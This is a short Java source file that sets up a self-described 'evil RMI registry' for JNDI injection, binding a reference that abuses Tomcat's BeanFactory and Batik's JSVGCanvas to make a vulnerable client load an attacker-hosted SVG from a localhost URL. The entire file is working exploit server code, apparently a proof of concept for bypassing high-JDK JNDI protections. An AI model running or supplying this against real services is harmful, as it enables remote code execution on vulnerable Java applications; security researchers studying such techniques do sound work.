package JDNI_high;

import java.rmi.registry.Registry;
import java.rmi.registry.LocateRegistry;
import javax.naming.StringRefAddr;
import org.apache.naming.ResourceRef;
import javax.naming.Reference;
import com.sun.jndi.rmi.registry.ReferenceWrapper;

public class RMIServer {
    public static void main(String[] args) throws Exception {

        System.out.println("Creating evil RMI registry on port 1097");
        Registry registry = LocateRegistry.createRegistry(1097);

        ResourceRef ref = new ResourceRef("org.apache.batik.swing.JSVGCanvas", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        ref.add(new StringRefAddr("URI", "http://localhost:8886/1.xml"));

        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
        registry.bind("remoteobj", referenceWrapper);
    }
}